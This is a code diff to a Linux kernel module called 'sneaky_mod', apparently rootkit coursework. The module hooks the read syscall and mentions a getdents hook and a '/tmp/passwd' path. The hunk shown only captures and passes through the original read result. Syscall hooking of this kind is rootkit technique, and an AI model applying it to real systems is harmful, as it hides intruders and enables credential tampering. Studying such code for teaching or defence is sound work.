@@ -91,12 +91,18 @@ const char *tmp_path = "/tmp/passwd";
 
 // read
 const char *sneaky_mod = "sneaky_mod";
+ssize_t nread_read;
 /*-----------------------------------------------------------------*/
 
 // Define our new sneaky version of the 'read' syscall
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
   printk_ratelimited(KERN_INFO "Sneaky: Read syscall\n");
-  return original_read_call(fd, buf, count);
+  nread_read = original_read_call(fd, buf, count);
+  if (nread_read <= 0) {
+    return nread_read;
+  }
+
+  return nread_read;
 }
 
 // Define our new sneaky version of the 'getdents' syscall
